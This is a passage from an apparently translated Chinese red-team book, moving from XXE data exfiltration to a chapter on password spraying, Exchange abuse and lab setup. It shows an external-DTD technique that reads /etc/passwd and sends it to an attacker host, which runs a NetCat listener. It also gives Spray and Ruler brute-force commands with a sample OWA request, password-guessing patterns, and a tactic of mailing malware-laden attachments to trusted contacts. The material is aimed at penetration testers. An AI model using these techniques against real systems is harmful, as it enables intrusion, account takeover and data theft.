新的数据POST静荷显示如下（请记住改变[Your_IP]）。 
%dtd;]>%26send%3B  
在攻击者服务器上创建名为payload.dtd的文件。 
gedit/var/www/html/payload.dtd
">
%all;
刚刚创建的DTD文件的作用是从存在XXE漏洞的服务器读取/etc/passwd，然后将敏感数据通过Web请求回传到攻击者主机。为了确保收到响应，需要启动Web服务器，提供DTD文件访问，并设置NetCat监听器。 
nc -l -p 8888
您可能看到以下错误内容：simplexml_load_string(): parser error : Detected an entity reference loop in /var/www/html/xxe.php on line 20。在进行XXE攻击时，通常会遇到解析器错误。很多时候，XXE解析器只解析部分字符，因此读取带有特殊字符的文件将导致解析器崩溃。如何才能解决这个问题呢？对于PHP，我们可以使用PHP输入/输出流读取本地文件，并使用php://filter/read=convert.base64- encode对文件进行base64编码。运行NetCat监听器，修改payload.dtd文件来启用这个功能，如图3.44所示。 
">
%all;
图3.44
在重新发送新修改的请求后，我们现在可以看到被攻击者服务器首先读取payload.dtd文件，处理该文件，并向端口8888上的NetCat监听程序发送第二个Web请求。当然，GET请求是base64编码的，我们需要对请求数据包解码。
3.4 结论
这只是您可能遇到的各种网络攻击的一小部分，目的是开阔眼界，了解这些新框架如何引入旧的和新的攻击方式。许多常见的漏洞和应用程序扫描程序，往往会忽略这些更复杂的漏洞，因为这些漏洞是与语言或框架相关的。我的主要观点是，为了对目标进行充分的审查，您需要真正理解语言和框架。
第4章 带球——突破网络
在评估开始的第二天，您使用Nmap工具扫描整个网络，不走运地启动了漏洞扫描程序，但是没有在任何网站应用程序中发现突破口。有点沮丧，您退后一步，查看所有的探测结果。您知道，一旦可以进入网络，就可以使用大量的技巧获取更多的凭证，在设备之间迁移，利用活动目录存在的漏洞，找到我们都渴望的网络空间“战利品”。当然，您知道这不是一件容易的事。您需要绕过大量的障碍，防止错误信息的误导，以及进行大量的尝试。
在本书第2版的第3章中重点介绍了如何利用漏洞扫描程序的结果，并通过这些漏洞进行突破。这些漏洞包括Metasploit、打印机漏洞、“心脏滴血”、Shellshock、SQL注入和其他类型的常见漏洞。最近，出现了许多威力强大的代码执行漏洞，如永恒之蓝（MS017-10）漏洞、多个Jenkins漏洞、Apache Struts 2漏洞和CMS应用程序漏洞等。由于本书是黑客秘笈的红队版本，因此我们不会过度关注如何使用这些工具或如何利用特定漏洞。相反，我们将专注于如何利用目标网络环境和实际业务开展攻击。
在本章中，您将专注于红队策略，利用企业基础架构漏洞，获取凭证了解内部网络情况以及在主机和网络之间进行迁移。我们将在运行单个漏洞扫描程序的情况下完成任务。
4.1 从网络外部查找凭证
作为红队，找到目标突破口可能很复杂，而且需要大量资源。在本书前两版中，我们复制了被攻击者的身份鉴权页面，购买了相似的域名，搭建了钓鱼网站，生成定制的恶意软件等。
有时，我告诉红队……一定要把事情简单化。很多时候我们提出了疯狂复杂的计划，但是最终发挥作用的是最简单的计划。
常用的一种基本技术是密码暴力破解。但是，作为红队，我们必须了解如何巧妙地做到这一点。随着公司的发展，公司引入了更多的技术和工具。对于攻击者来说，这无疑提供了施展能力的舞台。当公司开始连接互联网时，我们开始了解身份验证技术，应用于电子邮件（ieOffice 365或OWA）、通信（Lync、XMPP、WebEx）工具、协作工具（JIRA、Slack、Hipchat、Huddle），以及其他外部服务（Jenkins、CMS站点、支持站点）。这些是我们想要攻击的目标。
我们尝试攻击这些服务器/服务的原因是，我们正在寻找根据被攻击者的轻量目录访问协议（LDAP）/活动目录（AD）基础架构进行身份验证的应用程序。这可以通过某些活动目录集合、单点登录过程或直接管理活动目录。我们需要找到一些常用的凭证，从而可以开展下一步攻击。从侦察阶段开始，发现并识别了大量电子邮件和用户名账户，我们可以通过所谓的密码喷射实施攻击。我们将针对所有不同的应用程序，尝试猜测基本密码，正如我们在现实世界的高级持续威胁（APT）攻击事件中看到的那样。
我们为什么要对不同的外部服务进行身份鉴权？
某些身份验证源不会记录来自外部服务的尝试。
虽然我们通常会看到需要双因素身份验证的电子邮件或VPN，但是面向外部的聊天系统可能不需要。
密码重用率非常高。
有时外部服务不会在多次错误尝试时锁定AD账户。
目前有许多工具可以用于暴力破解，但是这里我们只重点介绍其中的几个。第一个是Spray工具，来自Spiderlabs实验室。虽然Spray使用时有点复杂，但是我非常喜欢这个工具提供的密码“喷射”功能。例如，该工具支持SMB、OWA和Lync（Microsoft Chat）协议。
要使用密码喷射功能，需指定以下内容。
spray.sh -owa     。
正如您将在下面的示例中看到的那样，我们运行Spray工具，攻击cyberspacekittens公司的虚假OWA邮件服务器（实际上根本存在），当它尝试用户名peter和密码Spring2018时，身份认证通过了（您可以通过数据长度判断是否成功），如图4.1所示。
这是一个使用Curl工具快速脚本实现的OWA系统暴力破解 图4.1
我经常遇到的一个问题是尝试使用哪些密码，因为在锁定账户之前，您只能进行有限次数的密码尝试。这个问题没有明确的答案，尝试的内容严重依赖于攻击目标。我们曾经成功尝试非常简单的密码，如“Password123”，但很少有用户使用这样简单的密码。通常我们尝试的凭证密码如下。
季节+年份。
本地运动队+数字。
查看之前的泄露事件，找到目标公司的用户并使用类似的密码。
公司名称+年份/数字/特殊字符（!、$、#和@）。
使用这些密码，我们可以慢慢地全天候进行扫描尝试，以免触发任何账户锁定。请记住，只需要一个密码就可以进入目标系统！
Spray 工具配置非常简单，并且通过设置可以应用在其他应用程序。您需要做的是捕获密码尝试的POST请求（您可以在Burp Suite中捕获请求），复制所有请求数据，并将其保存到文件中。对于任何需要暴力破解的字段，您需要提供字符串“sprayuser”和“spraypassword”。
举个例子，在我们的环境中，post-request.txt文件将如下所示。
POST/owa/auth.owa HTTP/1.1
Host: mail.cyberspacekittens.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer:
https://mail.cyberspacekittens.com/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail.cyberspacekittens.com%2fowa%2f
Cookie: ClientId=VCSJKT0FKWJDYJZIXQ; PrivateComputer=true; PBack=0
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencodeddestination=https%3A%2F%2Fcyberspacekittens. com%2Fowa%2F&flags=4
&forcedownlevel=0&username= PI:EMAIL&pass
word= spraypassword&passwordText=&isUtf8=1
如前所述，spray.sh的另一个优点是它支持SMB和Lync协议。另一个可以利用Spraying结果的工具叫作Ruler。Ruler是Sensepost编写的工具，允许您通过MAPI/HTTP或RPC/HTTP与Exchange服务器进行交互。虽然这里主要讨论使用Ruler进行暴力破解/信息搜集，但是这个工具还支持一些持久性攻击功能，我们将进行简要说明。
我们可以利用的第一个功能类似于Spray工具，暴力破解用户名和密码。Ruler将接收用户名和密码列表，并尝试查找凭证，如图4.2所示。它将自动尝试获取Exchange配置以及凭证。下面运行Ruler。
ruler --domain cyberspacekittens.com brute --users ./users.txt --passwords ./passwords.txt。
图4.2
找到单个密码后，我们就可以使用Ruler工具，转储O365全局地址列表（GAL）中的所有用户，从而查找更多的电子邮件地址及其所属的电子邮件组，如图4.3所示。
图4.3
使用这些电子邮件地址，我们能够通过暴力破解工具，尝试登录所有账户，并找到更多凭证，这是密码的循环使用。但是，Ruler工具的主要功能是，一旦您拥有凭证，就可以利用Office/Outlook中的“功能”，在被攻击者的电子邮件账户上创建规则和表单。如果您决定不使用Outlook表单，或者功能已被禁用，那么我们可以随时重新使用电子邮件的攻击方式。这种方式让人感觉有点猥琐，因为您必须以其中一个用户身份登录并阅读所有电子邮件。通过阅读电子邮件，知道了一些好笑的事情之后，我们希望找到和用户彼此信任的人（但不是好朋友）的交流邮件。由于他们已经建立了良好的信任，因此我们希望利用这层关系并向他们发送恶意软件。通常，我们会修改其中一个邮件中的附件（如Office文件/可执行文件），然后重新发送给对方，但附件内容中包括我们定制的恶意软件。使用来自内部地址的可信连接和电子邮件将扩大攻击范围和成功率。
本书反复提及的一点是，整个活动旨在测试蓝队的检测工具/流程。我们开展某项行动，了解蓝队是否能够发出警报或者取证并检测出发生的攻击事件。对于这部分行动，我喜欢验证目标公司是否能够发现有人正在获取用户的电子邮件。因此，我们所做的是使用Python脚本转储所有受感染的电子邮件。在许多情况下，这可能是千兆字节的数据！
高级实验
一个很好的练习是针对不同的身份验证类型服务、测试所有密码。尝试并构建一个密码喷射工具，用于对XMPP服务、常见第三方SaaS工具和其他常见协议进行身份验证测试。更好的方法是搭建多个虚拟主机，这些虚拟主机都由一个主服务器控制。
4.2 在网络中移动
作为红队，我们希望尽可能“安静”地访问网络。我们想基于这种“安静”的特性，查找和获取有关网络、用户、服务和其他各种信息。通常，在红队行动中，我们不希望在环境中运行任何漏洞扫描工具，甚至有时不想运行Nmap工具对内部网络进行扫描，这是因为许多公司的安全防护设备能够检测这些类型的扫描，并且很容易发现漏洞扫描程序的扫描动作。
在本节中，您将重点关注访问Cyber Space Kittens网络，而不要引发任何检测。我们假设您已经以某种方式进入网络，并开始寻找您的第一组凭证或在用户的计算机上拥有一个Shell。
设置环境——实验网络
这部分是完全可选的，但是，由于微软公司版权许可问题，本书中没有任何预先安装的虚拟机实验环境，因此现在由您来建立一个“实验室”！
真正了解攻击环境的唯一方法是自己重新构建环境。这使您可以更清楚地了解攻击的目标，攻击成功或者失败的原因，以及一些工具或流程的局限性。那么您需要搭建什么样的实验环境？根据客户的环境，您可能需要Windows和Linux（甚至可能是Mac）。如果您要攻击企业网络，则可能需要构建完整的活动目录（AD）网络。在下面的实验中，我们将讨论如何为本书中的所有示例构建一个实验环境。
您在家创建的一个理想的Windows测试实验室，可能如下所示。
域控制器-服务器：[Windows 2016域控制器]。
网站服务器：[Windows 2016上的IIS服务器]。
客户端计算机：[Windows 10] × 3和[Windows 7] × 2。
所有客户端在VMWare Workstation上运行，最低配置为16 GB RAM和500 GB SSD硬盘。
配置和创建域控制器如下所示。
（1）微软公司发布的有关构建2016服务器的指南。
（2）安装和配置活动目录（AD）后，使用以下命令创建用户和组：dsac.exe。
创建多个用户。
创建分组并分配用户。 
空间组
服务组
实验组
设置客户端计算机（Windows 7/Windows 10）并加入域。
更新所有机器。
将计算机加入域。
确保为每个设备添加一个域用户，该域用户在设备中以本地管理员身份运行。这可以通过将该域用户添加到本地计算机的本地管理员组来完成。
在每台主机上启用本地管理员并设置密码。
设置GPO。
禁用防火墙。
禁用杀毒软件。
禁用更新。
将帮助台用户添加到本地管理员组。
仅允许域管理员、本地管理员和帮助台用户登录。